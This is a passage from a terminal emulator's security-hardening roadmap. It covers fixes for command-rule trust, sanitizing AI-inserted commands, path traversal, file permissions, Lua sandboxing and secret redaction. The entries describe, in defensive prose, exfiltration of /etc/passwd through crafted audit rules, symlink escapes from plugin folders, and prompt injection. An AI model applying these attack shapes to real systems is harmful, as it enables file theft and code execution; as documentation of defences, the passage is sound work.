  collision between Ants instances.
- ✅ **Audit rule-pack `command` trust gate.** `loadUserRules()` now
  skips rules with a `command` field unless
  `Config::auditTrustCommandRules() == true` or
  `ANTS_AUDIT_TRUST_UNSAFE=1` is set. Default false — a cloned-but-
  untrusted project can no longer run arbitrary bash via
  `audit_rules.json`. Existing users who relied on command-rules
  opt in via config or env var; warning log surfaces the count of
  skipped rules at load time. Per-project hash-based trust store
  deferred to 0.7.13.
- ✅ **AI `insertCommand` prompt-injection mitigation.**
  `AiDialog::extractAndSanitizeCommand` (new static helper) strips
  C0 controls `{0x00..0x08, 0x0B..0x1F, 0x7F}` from the AI-suggested
  command while preserving HT/LF/CR + UTF-8 multi-byte, caps length
  at 4 KiB. The click handler now requires explicit user
  confirmation via a `QMessageBox::question` showing the literal
  bytes (with a "N bytes were filtered" note when non-zero) before
  emitting `insertCommand`. OWASP LLM01+LLM02 mitigation.
  Regression test: `tests/features/ai_insert_command_sanitize/`
  (18 assertions, behavioral + source-grep on the confirm-before-
  emit invariant).
- ✅ **Audit user-glob path canonicalization.** Shipped 0.7.20.
  New `AuditDialog::resolveProjectPath` helper runs
  `QFileInfo::canonicalFilePath` (resolves both `..` components and
  symlinks) and requires the canonical result to sit under the
  canonical project root with an anchored-slash prefix so sibling
  directories sharing a name prefix can't escape. Six call sites
  migrated from raw `m_projectPath + "/" + f.file` concat:
  `dropFindingsInCommentsOrStrings`, `inlineSuppressed`, the
  enrichment pass (snippet preview + blame), single- and batch-
  AI-triage snippet fallbacks, and the `dropIfContextContains`
  regex-capture file read. Closes the OWASP-LLM06 exfiltration
  surface where a malicious user rule could POST `/etc/passwd` (or
  any UID-readable file) to the configured /v1/chat/completions
  endpoint wrapped in a "review this snippet" prompt. Regression
  test: `tests/features/audit_path_traversal/` — 5 invariants
  behavioral (literal `../`, symlink escape, in-project accept,
  non-existent, empty-input) plus source-grep on auditdialog.cpp
  confirming call-site migration + helper structure
  (canonicalFilePath + anchored startsWith).
- ✅ **Allowlist `QSaveFile` perms belt-and-suspenders.** Shipped in
  [Unreleased]. `ClaudeAllowlistDialog::saveSettings()` now calls
  `setOwnerOnlyPerms(m_settingsPath)` after `file.commit()` succeeds,
  gated on `if (!file.commit()) return false;` so a failed commit
  can't chmod a path that may not exist. The pre-commit fd-level
  `setOwnerOnlyPerms(file)` is retained — both are needed (neither
  subsumes the other). Closes the FAT/exFAT/SMB/NFS/copy-unlink-
  fallback window where the final file could land at the process
  umask (typically 0644) even though the temp fd was 0600; relevant
  because `settings.local.json` can hold Claude Code bearer tokens.
  Locked by `tests/features/allowlist_perms_postcommit` (runtime
  stat check plus source-grep that both chmod calls remain and the
  post-commit call is sequenced after the commit-success gate).

### 🔒 Tier 2 — hardening sweep

- ✅ **PTY `closefrom` replacement.** Shipped 0.7.27. `Pty::start`
  now issues `::syscall(SYS_close_range, 3, ~0U, 0)` first
  (single signal-safe syscall on Linux 5.9+, atomic over the whole
  range, ignores the soft cap), with a `getrlimit(RLIMIT_NOFILE)`-
  bounded fallback when the syscall is unavailable. Fallback bound
  is capped at 65536 to avoid the unbounded-loop pathology on
  hardened-server profiles where `rlim_cur` is in the hundreds of
  thousands. The previous hard-coded `fd<1024` loop silently
  leaked descriptors above 1023 on systemd / container default
  `RLIMIT_NOFILE` profiles — Qt display socket, D-Bus session,
  plugin HTTP, Lua eventfds, remote-control IPC. Locked by
  `tests/features/pty_closefrom` (5 invariants — close_range
  reference, no fd<1024 loop, RLIMIT_NOFILE consulted, headers
  included, 65536 sanity cap). Pre-fix source fails 4 of 5;
  post-fix all 5 pass.
- ✅ **Process-wide `signal(SIGPIPE, SIG_IGN)` in `main.cpp`.** Shipped
  0.6.28 (bc97485) but never regression-tested. Locked 0.7.17 via
  `tests/features/sigpipe_ignore` (source-grep invariants: the call
  exists, appears before `QApplication` construction, `<csignal>` is
  included).
- ✅ **PTY write EAGAIN queue.** Shipped 0.7.27. `Pty::write` now
  branches on `EAGAIN`/`EWOULDBLOCK` distinctly from fatal errors,
  copies the unwritten remainder into a new `m_pendingWrite` queue,
  and enables a `QSocketNotifier(QSocketNotifier::Write)` (created
  disabled in `Pty::start` because PTY masters are writable nearly
  continuously). New `Pty::onWriteReady` slot drains the queue when
  the kernel signals writability and disables the notifier on
  completion. FIFO ordering preserved — a fresh `write()` while
  the queue is non-empty appends rather than bypass. Queue capped at
  4 MiB (`MAX_PENDING_WRITE_BYTES`) so a permanently-stuck slave
  cannot OOM the GUI process. Locked by
  `tests/features/pty_write_eagain_queue` (7 invariants — write-
  notifier created, queue + notifier members declared, slot declared
  and connected, EAGAIN handled distinctly, 4 MiB cap, FIFO check).
  Pre-fix source fails 5 of 7; post-fix all 7 pass.
- ✅ **PTY dtor off-main-thread.** Shipped 0.7.33. The
  `Pty::~Pty` destructor now spawns a detached `std::thread` for
  the SIGTERM/SIGKILL escalation, with the cheap pre-escalation
  reap (SIGHUP + close fd + `waitpid(WNOHANG)`) staying on the
  calling thread so well-behaved children don't pay a thread
  spawn. Pid captured by value; `try { ... }.detach()` wrapped
  in a `catch (const std::system_error &)` that falls back to
  the synchronous escalation when thread creation fails. Pre-fix
  N split panes closing together blocked the GUI N×500 ms;
  post-fix it's microseconds per pane regardless of how
  stubborn the children are. Locked by
  `tests/features/pty_dtor_off_main_thread/` — 11 invariants on
  `<thread>` include, dtor body shape, lambda capture list, and
  fallback retention.
- ✅ **RIS (`ESC c`) preserves all integration callbacks.** Shipped
  0.7.17. The reset handler now stashes + restores 8 callbacks
  (`response`, `bell`, `notify`, `lineCompletion`, `progress`,
  `commandFinished`, `userVar`, `osc133Forgery`) plus `m_osc133Key`.
  Security-relevant: previously a well-timed `tput reset` silenced
  the OSC 133 forgery alarm permanently. Locked by
  `tests/features/ris_preserves_callbacks` (all 8 callbacks fire
  pre-RIS, fire again post-RIS; key survives; grid state actually
  reset).
- ✅ **Origin-mode translate on CUP / DECSC save origin.** Shipped
  0.7.34. `TerminalGrid::handleCsi` (`terminalgrid.cpp`) now
  translates the row argument of CUP, HVP, and VPA through the
  active DECSTBM scroll region when DECOM is set (previously CUP
  jumped to absolute rows under origin mode). DECSTBM home rebases
  on the region top with the same translation. DECSC additionally
  saves DECOM + DECAWM into the cursor-save record so DECRC
  restores the full mode set — pre-fix tmux/screen save-restore
  round-trips silently dropped the flags. Locked by
  `tests/features/origin_mode_correctness/` (7 invariants over
  CUP/HVP/VPA translation, DECSTBM home, and DECSC/DECRC
  round-trip).
- ✅ **OSC 8 URI cap + Kitty APC `m_kittyChunkBuffer` cap.** Shipped
  0.7.25. `TerminalGrid::MAX_OSC8_URI_BYTES = 2048` rejects the open
  of any OSC 8 hyperlink whose URI exceeds 2 KiB (following text
  prints unlinked — same drop path as the invalid-scheme branch).
  `MAX_KITTY_CHUNK_BYTES = 32 MiB` caps the APC chunk-accumulation
  buffer used across `m=1` frames; past the cap the staged bytes are
  dropped + `shrink_to_fit`'d and subsequent `m=0` closes see an empty
  buffer. Previously both accumulators were bounded only by the VT
  parser's per-envelope 10 MB ceiling, so hostile terminal output
  could wedge tens of GB into per-row hyperlink spans / scrollback
  or into the staging buffer before any downstream guard ran.
  Regression test: `tests/features/osc8_apc_memory_caps/` (5
  invariants — happy path, oversized-drop, at-cap-accepted, APC
  single-frame, APC overflow-dropped). Pre-fix source fails
  INV-OSC8-B and INV-APC-B; post-fix all 5 pass.
- ✅ **BCE on scroll + erase paths.** Shipped 0.7.23. `clearRow`
  already had the `m_currentAttrs.bg.isValid()` fallback, but
  `takeBlankedCellsRow()` hardcoded `m_defaultBg` (used by IL/DL/SU/SD
  and the LF-past-scroll-bottom auto-scroll) and `deleteChars` /
  `insertBlanks` used bare `m_currentAttrs.bg` with no valid guard.
  Consolidated into a single `eraseBg()` helper on TerminalGrid.
  Regression test `tests/features/bce_scroll_erase` locks 10
  behavioral subcases. Pre-fix source fails 5; post-fix all 10 pass.
- ✅ **Wide-char overwrite zeroes the mate.** Shipped 0.7.24. Both
  `handlePrint` (narrow + wide branches) and the SIMD fast path
  `handleAsciiPrintRun` now route their writes through a single
  `breakWidePairsAround(row, startCol, endCol)` helper that runs
  BEFORE the write: it blanks a stranded `isWideChar` mate on the
  left edge (when the write lands on an `isWideCont`) and clears a
  stranded `isWideCont` on the right edge (when the write clobbers
  the first half whose continuation lives one past the region).
  Regression test `tests/features/wide_char_overwrite_mate` locks 5
  subcases (narrow-over-right, narrow-over-left, wide-over-wide-
  shifted, ASCII-fast-path, non-overlap-preservation). Pre-fix
  source fails 4 subcases; post-fix all 5 pass.
- ✅ **`background_alpha` — dropped as redundant.** Shipped in
  [Unreleased]. User confirmed (2026-04-24) they use `opacity`
  ~0.9-0.95 to make the terminal area translucent while chrome
  stays solid — exactly what the `opacity` config key already
  does (paint site at `terminalwidget.cpp:605` applies per-pixel
  alpha via `m_windowOpacity`). Since `background_alpha` had no
  UI widget, no paint-site consumer, and overlapped intent with
  `opacity`, removed the config getter/setter, the
  `TerminalWidget::setBackgroundAlpha` method, and the
  `m_backgroundAlpha` member entirely. Stale key in existing
  `config.json` files is harmlessly ignored on load. README
  example + defaults table pruned in the same commit.
- ✅ **`terminal_partial_update_mode` spec rewrite.** Shipped in
  [Unreleased]. The `.cpp` test already enforced the correct
  post-0.7.4 invariant (TerminalWidget is a plain `QWidget`,
  `QOpenGLWidget::` call-shape absent, `makeCurrent()` calls absent);
  only the adjacent `spec.md` still documented the pre-0.7.4
  PartialUpdate fix. Spec rewritten to match the test: problem
  description preserved, "Fix" section now explains the full base-
  class switch (not setUpdateBehavior), Invariants list mirrors the
  4 INVs the test actually enforces, History section covers the
  PartialUpdate detour that didn't fix it. Directory name kept for
  CMake stability.
- ✅ **Lua: strip `string.dump`, pass `"t"` mode to `luaL_loadfilex`.**
  Shipped 0.7.21. `sandboxEnvironment()` now removes `string.dump`
  via `lua_setfield(m_state, -2, "dump")` scoped to the already-
  loaded string table (the `dangerous[]` global-nil loop misses
  table members by construction). `loadScript` replaces
  `luaL_dofile` with `luaL_loadfilex(..., "t") + lua_pcall`,
  adding a second rejection gate at the Lua loader level for
  bytecode chunks (the first gate is the 0x1b-first-byte peek,
  already in place). Locked by `lua_sandbox_hardening` I1 + I4.
- ✅ **Lua: cap manifest size + canonical plugin path.** Shipped
  0.7.33. `PluginManager::scanAndLoad` now reads at most 1 MiB of
  `manifest.json` via `f.read(kMaxManifestBytes)` (was unbounded
  `f.readAll()` — a multi-GB manifest would OOM-kill the process
  before QJsonDocument could reject it). Plugin scan anchors on
  `QFileInfo(m_pluginDir).canonicalFilePath()` and passes
  `QDir::NoSymLinks` to `entryList`; per-entry it computes the
  canonical path of each candidate plugin dir and rejects any
  whose canonicalized path doesn't equal the canonical root or
  start with `canonicalRoot + "/"`. Closes the symlink-escape
  shape where a hostile plugin tarball's `evil -> /etc/cron.daily`
  could redirect the loader. Locked by
  `tests/features/plugin_manifest_safety/` — 12 invariants on the
  cap, NoSymLinks, canonical anchor, per-entry containment.
- ✅ **Lua: clear hook before `lua_close` in `shutdown()`.** Shipped
  0.7.21. `LuaEngine::shutdown` calls `lua_sethook(m_state,
  nullptr, 0, 0)` before `lua_close(m_state)` — closes the UAF
  window where `__gc` metamethods running during destruction
  could observe a partially-finalized engine via the count hook's
  registry lookup of `__ants_engine`. Locked by
  `lua_sandbox_hardening` I5.
- ✅ **Lua: reconcile resource-limit docs.** Shipped 0.7.18
  (PLUGINS.md rewrite). Previously documented as "per plugin per
  event invocation" with each event getting a fresh 10M-instruction
  budget; the implementation sets `lua_sethook(LUA_MASKCOUNT,
  10000000)` once at engine init and the counter accumulates across
  all handlers in the same VM until the hook fires. PLUGINS.md now
  describes the real per-VM-cumulative contract.
- ✅ **Session file: SHA-256 payload checksum.** Shipped 0.7.30.
  `SessionManager::serialize` now wraps the qCompress output in a V4
  envelope `[SHEC magic 0x53484543][envelope version=1][SHA-256 of
  payload (32 bytes)][payload length (uint32)][compressed payload]`;
  `restore` peeks the magic, verifies the hash, and refuses to restore
  on version mismatch, length disagreement, or hash mismatch. Inner
  `QDataStream` format unchanged (still V3) — the integrity layer is
  framing-only. Legacy V1-V3 files continue to load via the magic-peek
  fall-through; their next save writes them out as V4 organically.
  Bundled with the qUncompress pre-flight + cell-loop status checks
  below as the 0.7.30 "Session-file integrity" release. Regression
  test `tests/features/session_sha256_checksum` (4 invariants).
- ✅ **Session file: pre-validate compressed length prefix before
  `qUncompress`.** Shipped 0.7.30. `restore` reads the first 4 bytes
  of the compressed payload, reconstructs the big-endian uint32, and
  rejects any claim above `MAX_UNCOMPRESSED` (500 MB) BEFORE
  `qUncompress` runs — constant-time, no allocator pressure. Short-
  payload guard (`compressed.size() < 4`) keeps the same path safe
  against truncated inputs that can't carry a length prefix. The
  post-decompression cap remains as a defense-in-depth backstop.
  Regression test `tests/features/session_qcompress_length_guard`
  (4 invariants).
- ✅ **Session file: `QDataStream::status()` checks inside cell loop.**
  Shipped 0.7.30. `readCell` now returns `bool` and short-circuits on
  `in.status() != QDataStream::Ok`; every call site (scrollback cells,
  screen cells in range, screen cells skipped on width or height
  shrink) is guarded by `if (!readCell(...)) return false`. The
  combining-character helper checks status after each codepoint read,
  so a stream truncated mid-codepoint can't push default-constructed
  `0` into the combining map either. Pre-fix, a partial save (kernel
  crash mid-fsync, disk-full mid-write, hostile sender truncating the
  envelope payload) could materialize as garbage cells in the next
  restore — not a crash, but a corrupted scrollback. Regression test
  `tests/features/session_cell_loop_stream_status` (3 invariants).
- ✅ **Portal session close.** Shipped 0.7.33.
  `GlobalShortcutsPortal` now has a destructor that issues an
  asynchronous `org.freedesktop.portal.Session.Close` call
  against `m_sessionHandle` (when non-empty) before the QObject
  unwinds. New `kSessionIface` constant alongside the existing
  service/path/interface constants in the anonymous namespace.
  Pre-fix `xdg-desktop-portal` accumulated one orphan session
  per Ants invocation that crashed / was SIGKILLed, released
  only when the portal service itself restarted. Locked by
  `tests/features/portal_session_close/` — 8 invariants on
  header dtor declaration, kSessionIface constant, empty-handle
  early return, and the asyncCall(createMethodCall(...,
  "Close", ...)) dispatch.
- ✅ **Cached dialog + stale-widget-state on external config reload.**
  Shipped 0.7.20. `MainWindow::onConfigFileChanged` now closes the
  cached `m_settingsDialog` (if visible), schedules it via
  `deleteLater()`, and nulls the pointer before re-applying settings,
  so the next Preferences... open rebuilds the dialog from the
  freshly reloaded `m_config`. Pre-fix the address of `m_config` was
  stable (value member) so the Config pointer wasn't strictly
  dangling, but the dialog's widgets were populated at construction
  time and held pre-reload values — a subsequent Save would silently
  overwrite the external edit. Regression test:
  `tests/features/settings_dialog_config_reload/` — 4 source-grep
  invariants scoped to the function body (cache nulled,
  visible-then-close gate, deleteLater not raw delete, invalidation
  exclusive to `onConfigFileChanged`).
- ✅ **`WA_OpaquePaintEvent` on `m_menuBar`.** Shipped in [Unreleased].
  `MainWindow` ctor now calls
  `m_menuBar->setAttribute(Qt::WA_OpaquePaintEvent, true)` — stops Qt
  from invalidating the translucent parent's compositor region under
  the menubar when it repaints. Closes the mouse-move-over-menubar
  dropdown flicker on KWin that the 0.7.4 QOpenGLWidget→QWidget
  refactor didn't fully eliminate. `menubar_hover_stylesheet` test
  INV-3b reinstated (was previously marked "moved to terminal_partial_update_mode"
  but that test covers an orthogonal fix; both now assert their own
  attribute).
- ✅ **SARIF emit suppressed findings with `suppressions[]` array.**
  Shipped 0.7.29. Parse pipeline marks suppressed findings via
  `Finding::suppressed = true` instead of dropping them; render paths
  (UI, HTML, plain-text) keep filtering via `isSuppressed`; SARIF
  export iterates ALL findings and attaches a `suppressions[]` block
  (`kind: "external"`, `state: "accepted"`, `justification`: user's
  reason from `~/.audit_suppress` JSONL). Reasons surfaced via a new
  `m_suppressionReasons: QHash<QString,QString>` map populated by
  `loadSuppressions` and mirrored by `saveSuppression`. Locked by
  `tests/features/audit_sarif_suppressions` (5 invariants).
- ✅ **Audit: per-tool timeout override.** Shipped 0.7.28. New
  `int timeoutMs = 30000;` trailing field on the `AuditCheck`
  aggregate; `runNextCheck` reads `check.timeoutMs` instead of the
  hard-coded global. Calibration loop at the end of `populateChecks`
  bumps known-slow tool IDs to 60 s (`cppcheck`, `cppcheck_unused`,
  `clang_tidy`, `clazy`), 90 s (`semgrep`), or 120 s
  (`osv_scanner`, `trufflehog`). Timeout-handler warning string is
  now formatted from the actual cap. Locked by
  `tests/features/audit_per_tool_timeout` (4 invariants).
- ✅ **Audit: incremental QProcess output drain.** Shipped 0.7.28.
  Constructor connects `readyReadStandardOutput` /
  `readyReadStandardError` to new `onCheckOutputReady` /
  `onCheckErrorReady` slots that append to `m_currentOutput` /
  `m_currentError` incrementally. On overflow
  (`MAX_TOOL_OUTPUT_BYTES = 64 * 1024 * 1024`), the process is killed
  and `m_outputOverflowed` is flagged so `onCheckFinished` surfaces
  a distinct "Output exceeded N MiB cap" warning. Buffers reset
  before each check via `runNextCheck`. New `connectProcessSignals`
  helper centralises the finished + drain connections so the
  kill / reconnect cycles never lose a slot. Pragmatically chose
  in-memory bounded buffer over the temp-file approach — temp
  files complicate cleanup and overflow itself indicates a broken
  tool worth surfacing rather than hiding. Locked by
  `tests/features/audit_incremental_output_drain` (6 invariants).
- ✅ **Audit: regex-DoS watchdog on user `drop_if_matches` /
  `.audit_allowlist.json`.** Shipped 0.7.29. Two-layer defense:
  static `isCatastrophicRegex` heuristic rejects nested-quantifier
  shapes (`(.+)+`, `(\w*)*`, `(.*)+`) at compile time with a qWarning
  naming the offending pattern; surviving patterns are wrapped in
  PCRE2's `(*LIMIT_MATCH=100000)` inline option via `hardenUserRegex`
  so even shapes that slip past the heuristic have a bounded
  match-step budget — PCRE2 returns "no match" on overrun
  (fail-safe). 100k steps handles every sane pattern (typical match
  completes in < 1k) and aborts adversarial patterns within
  milliseconds. Skipped the QtConcurrent + thread-watchdog approach
  in favour of PCRE2's built-in step counter; cheaper and
  deterministic. Locked by `tests/features/audit_regex_dos_watchdog`
  (4 invariants).
- ✅ **Audit: widen `computeDedup` to 96 bits (24 hex chars).**
  Shipped 0.7.29. `.left(16)` → `.left(24)` raises the birthday
  collision threshold from ~2^32 to ~2^48 for 8 extra bytes per
  stored key — well past any plausible project's lifetime
  collection. New `bool AuditDialog::isSuppressed(const QString
  &dedupKey) const` helper encapsulates a backward-compat lookup:
  match either the full 24-char key OR the leading 16-char prefix,
  so existing pre-0.7.29 user `~/.audit_suppress` entries continue
  to suppress new 24-char findings without forcing a migration. Six
  render-pipeline call sites that previously read
  `m_suppressedKeys.contains(f.dedupKey)` now route through the
  helper. Locked by `tests/features/audit_dedup_96bit`
  (4 invariants).
- ✅ **Audit: distinguish "tool exited non-zero with empty stdout"
  from "tool reported no findings".** Shipped 0.7.28.
  `onCheckFinished`'s parameters are now named (`exitCode`,
  `exitStatus`) and the function branches on `QProcess::CrashExit`
  to emit a "Tool crashed (signal exit)" warning, on
  `exitCode != 0 && stdout empty && stderr non-empty` to emit a
  "Tool exited N with no findings on stdout" warning. Both warnings
  demoted to `Severity::Info`. The four exit modes (timeout,
  overflow, crash, non-zero-with-stderr-only) funnel through a
  single `makeToolHealthWarning()` helper that centralises the row
  shape. Locked by `tests/features/audit_tool_crash_distinct`
  (4 invariants).
- ✅ **Concurrent-writer guard on `config.json` + `settings.local.json`.**
  Shipped 0.7.31. Both writers now go through the
  `WithFileLock` RAII helper (`secureio.h`), which acquires an
  advisory `flock(LOCK_EX)` on a sibling `.lock` file before the
  atomic write+rename and releases on scope exit. Two ants
  processes (or ants + a side-channel writer) serialise instead of
  racing — last-writer-wins is replaced by last-acquired-lock-wins,
  with the loser blocking ~1 ms and seeing the winner's bytes. Same
  pattern reused in `claudeallowlist.cpp` and `debuglog.cpp` for
  consistency. Locked by `tests/features/concurrent_writer_lock/`
  (4 invariants over the lock-file path, the
  `setOwnerOnlyPerms` post-rename re-chmod, the lock RAII, and the
  fcntl LOCK_EX / LOCK_UN ordering).
- ✅ **`debug.log` 0600 perms.** Shipped 0.7.20. `DebugLog::setActive`
  now calls `setOwnerOnlyPerms` on both the opened `QFileDevice` and
  the path string immediately after open, before the session header
  is written. The fd-level call covers the just-opened descriptor;
  the path-level call narrows any pre-existing 0644 file that append
  reused from a prior (pre-fix) run. Fix uses the project-standard
  `secureio.h` helper, matching every other persistence site in the
  project. Regression test: `tests/features/debuglog_perms/` —
  4 invariants (fresh open under umask 0022 → 0600, clear+reopen
  preserves 0600, pre-existing 0644 narrowed, source uses the
  helper).
- ✅ **Claude transcript: 32 KB tail window → scan-for-first-newline +
  grow.** Shipped 0.7.14. Replaced the fixed 32 KB window +
  firstLine-skip with a doubling-grow loop (32 KB → 4 MiB cap) that
  trims the potentially-partial prefix line only when the buffer
  contains ≥ 2 newlines, guaranteeing real content remains for the
  parser.
- ✅ **Claude transcript: handle `thinking` content blocks.** Shipped
  0.7.14. `ClaudeTranscriptDialog::formatEntry` now renders `thinking`
  blocks as italicized, dimmed paragraphs so readers can tell them
  apart from the visible reply.
- ✅ **`decodeProjectPath` preserves hyphens.** Shipped 0.7.14.
  Rewrote as a greedy filesystem-probing walker: at each hyphen,
  prefer `/` if that directory exists, fall back to `-` if that
  exists instead, default to `/` otherwise. Preferred source of
  truth is still `extractCwdFromTranscript`; the new decoder is the
  last-resort fallback.

### 🔁 Follow-ups from the re-review checkpoint (2026-04-23)

The 8-agent re-review of the Tier 1 batch surfaced a second wave of
findings. The HIGH ones landed in the same commit (missed settings-
dialog site, SSH `Match exec` / `KnownHostsCommand`, AI bidi /
C1 / NEL / LS-PS stripping + preview-length parity). These are the
remainder, captured so they don't drop on the floor.

- ✅ **Config backup retention cap.** Shipped 0.7.12 (code) +
  0.7.15 (regression test). `rotateCorruptFileAside` prunes siblings
  beyond the newest 5; ranks on mtime, not filename timestamp.
  `config_parse_failure_guard` INV-5 plants 8 stale backups and
  confirms post-prune count.
- ✅ **Remote-control: cache gate decision at process start.** Shipped
  0.7.12. `mainwindow.cpp:799` uses `static const bool
  remoteControlGate = m_config.remoteControlEnabled()` so a second
  MainWindow doesn't re-read the flag.
- ✅ **Remote-control: behavioral gate test.** Shipped 0.7.15. Config
  round-trip assertion replaces the 0.7.12 grep-for-getter-name
  approach (a rename would have silently defeated the grep).
  Structural "start() lives inside a conditional" check retained
  as plain-substring lookback.
- ✅ **Remote-control: `filterControlChars` header comment.** Already
  accurate in `remotecontrol.h:70-79` — "Strip C0 control bytes"
  with explicit rationale for why C1 is the AI-dialog layer's job
  (C1 bytes are UTF-8 continuation, structurally can't be stripped
  at byte level).
- ✅ **Audit rule-pack trust: project-scoped store.** Shipped 0.7.13.
  Replaced the global `audit_trust_command_rules` bool with a
  `{canonical project_path → sha256(audit_rules.json)}` store
  (`Config::isAuditRulePackTrusted` / `trustAuditRulePack` /
  `untrustAuditRulePack`). Trusting one project no longer extends to
  siblings; any rule-pack edit invalidates trust.
- ✅ **Audit rule-pack trust: in-dialog UI surface.** Shipped 0.7.13.
  Skipped-rule count appears on the Detected-types row as an
  "Untrusted rules: N" badge with a tooltip explaining the opt-in
  path. Stderr `qWarning` retained for headless / CI invocations.
- ✅ **Audit rule-pack trust: regression test.** Shipped 0.7.13.
  `tests/features/audit_command_rule_trust/` locks seven invariants:
  default-untrusted, round-trip, hash-invalidation, project-scoping,
  symlink+trailing-slash canonicalization, idempotent untrust, and
  cross-instance persistence.
- ✅ **`/tmp/kwin_*.js` orphan cleanup.** Shipped 0.7.15.
  `MainWindow` ctor runs `sweepKwinScriptOrphansOnce()` — a
  once-per-process scan of `kwin_{pos,move,center}_ants_*.js` with
  an mtime older than 1 hour. Guarded by a `static bool` so a
  second MainWindow (File → New Window) doesn't re-sweep.
- ✅ **Plugin-manager `manifest.json` + themes `*.json` parse warnings.**
  Already implemented. `pluginmanager.cpp:146` + `themes.cpp:308`
  both emit `qWarning` with error string + byte offset when
  `QJsonDocument::fromJson` fails.
- ✅ **AI `sendRequest` context redaction (OWASP LLM06).** Shipped in
  [Unreleased]. New header-only module `src/secretredact.h` exposes
  `SecretRedact::scrub(QString) → {text, redactedCount}` with a
  14-shape priority-ordered regex set (AWS AKIA/ASIA; GitHub classic
  / OAuth / app / fine-grained PATs; Anthropic, OpenAI project + legacy;
  Slack, Stripe, JWT; `Bearer <token>`; generic
  `api_key=`/`token=`/`password=`/`secret=` assignments; multi-line
  PEM private-key blocks). `AiDialog::sendRequest` now scrubs both
  `m_terminalContext` and `userMessage` before either reaches the
  JSON body; the chat history's "You:" display keeps the
  pre-redaction text (redaction is a network-boundary concern, not a
  UX one). When `redactedCount > 0` the dialog appends a System note
  so the user knows the payload differs from what they saw/typed.
  Contract pinned by `tests/features/ai_context_redaction/spec.md`
  + 16-positive + 6-negative + source-grep feature test. Verified to
  fail against pre-fix source (5 grep invariants fail as expected)
  before locking.
- ✅ **AI `extractAndSanitizeCommand` language-hint heuristic.** Shipped
  0.7.12 (same commit as the Tier 1 AI sanitize work). The gate was
  tightened to `nl > 0 && nl < 10 && !first.contains(' ') &&
  !first.contains('\t')` in `aidialog.cpp` — language IDs are single
  unbroken tokens, so a short first line containing whitespace is a
  real command (e.g. `foo bar`) and must not be eaten. Locked by
  `tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp`
  at the "short first line with space is NOT a lang hint" and "short
  first line with tab is NOT a lang hint" cases. Roadmap bullet was
  stale; marking now.
- ✅ **Allowlist + settings-dialog feature-test analogs.** Shipped
  0.7.31 via `tests/features/settings_parse_failure_mirror/` (8
  invariants: rotation call site, return-false-after-rotation
  gating, open-failure branch distinct from parse-failure branch,
  comment anchors). Closes the test-coverage hole — the code was
  already correct (0.7.12), but only Config had behavioural test
  coverage.
- ✅ **Spec.md timestamp format drift.** Spec already uses
  `<ms_timestamp>` (line 51), matching the code. Roadmap bullet
  was stale.
- ✅ **`secureio.h` split.** Shipped 0.7.31. `secureio.h` is now
  perms-only (`setOwnerOnlyPerms` overloads). `configbackup.h` owns
  `rotateCorruptFileAside` (silent-data-loss recovery, was 0.7.12)
  + the new `ConfigWriteLock` (cooperative POSIX flock(2) RAII guard,
  added this release). Split happened *before* the third helper
  landed — the trigger was wanting to add ConfigWriteLock, which
  is even less about perms than rotation. Locked by
  `tests/features/secureio_configbackup_split/` — 13 invariants
  on file-content boundaries, non-copyable lock, and downstream
  caller include sets.
- ✅ **Plan-mode regression-test tightening.** Shipped 0.7.15.
  `runToggleFreeTailPreservesState` now attaches a
  `QSignalSpy(&ci, &ClaudeIntegration::planModeChanged)` and asserts
  exactly one emission across both parse phases (seed triggers
  NotSet → plan; tail phase has zero permission-mode events and
  must not re-fire).

### 🎨 Claude Code UX — per-tab status indicator (user request 2026-04-23)

- ✅ **Per-tab Claude-Code activity indicator.** Shipped in
  [Unreleased]. New `ClaudeTabTracker` class (`src/claudetabtracker.
  {h,cpp}`) keys per-shell state by PID (not tab index — stable under
  reorder), shares the transcript-tail parser with the singleton
  `ClaudeIntegration` via a new static `parseTranscriptTail` helper
  (no code duplication). `ColoredTabBar::paintEvent` gained a second
  pass that calls an `IndicatorProvider` callback to render an 8 px
  dot at the leading edge of each tab — muted grey for Idle /
  Thinking, blue for ToolUse, green for Bash (distinct from generic
  ToolUse because it's the longest-running, highest-signal tool),
  cyan for Planning, violet for Compacting, bright orange with a
  white outline for AwaitingInput. Permission prompts route by the
  hook event's `session_id` (matched against the transcript
  filename's UUID basename) so a prompt emitted by Claude in tab 3
  lights up **tab 3's** glyph, not the currently-focused tab;
  scroll-scan detection carries the owning terminal pointer directly
  so it routes without session-id. Permission-prompt resolution
  (Allow / Deny / Add-to-allowlist), terminal scanner retraction,
  toolFinished, and sessionStopped all clear the flag. Tab hover
  tooltip shows "Claude: thinking…" / "Claude: Bash" / etc. so the
  user can disambiguate glyphs without switching tabs. Settings
  dialog (General tab) checkbox flips `claude_tab_status_indicator`
  (default on); change takes effect on next paint via the live
  config reload path without app restart. Contract locked by
  `tests/features/claude_tab_status_indicator/spec.md` + 11-invariant
  feature test. Stage 1 scope complete.

### 🎨 Claude Code UX — token-saving git-context hook (user request 2026-04-24)

- ✅ **UserPromptSubmit git-context hook.** Shipped in [Unreleased].
  New Settings button "Install git-context hook" writes
  `~/.config/ants-terminal/hooks/claude-git-context.sh` + merges a
  `hooks.UserPromptSubmit` entry into `~/.claude/settings.json` so
  every Claude Code prompt carries a compact `<git-context>` block
  (branch, upstream, ahead/behind, staged/unstaged/untracked
  counts). Claude sees repo state without running `git status` via
  Bash — saves ~400–600 tokens per turn where the model would have
  otherwise queried. Global (user's explicit ask: "Can this hook be
  available to all projects?") because `~/.claude/settings.json` is
  user-scope; hook no-ops outside git repos / when `git` isn't on
  PATH, so non-repo sessions see no behaviour change. Independent
  of the existing status-bar hook installer (different data flow:
  Claude→git vs Ants→Claude). Pinned by
  `tests/features/claude_git_context_hook/spec.md` — 10 installer
  source-grep invariants (idempotency, UserPromptSubmit targeting,
  parse-error-refuse, user-hook preservation, global-scope only,
  dedicated button wiring) + 5 behavioral script invariants
  (not-a-repo no-op, git-missing no-op, clean repo, dirty repo
  counts, `CLAUDE_PROJECT_DIR` override).

### 🎨 Claude Code UX — manual tab rename stomped (user request 2026-04-24)

- ✅ **Right-click "Rename Tab…" pins the label.** Shipped in
  [Unreleased]. The rename handler at `mainwindow.cpp:4284` wrote
  directly to `m_tabWidget->setTabText` without populating
  `m_tabTitlePins`; the `titleChanged` signal handler and the 2 s
  `updateTabTitles` tick both consult the pin map, so Claude Code's
  per-prompt OSC 0/2 title writes wiped the manual name within
  seconds. Rename now routes through `setTabTitleForRemote` (the
  rc_protocol `set-title` path) — non-empty names pin, empty names
  clear the pin and restore the format-driven / shell-driven label,
  giving the user an in-UI "un-rename" path that didn't exist
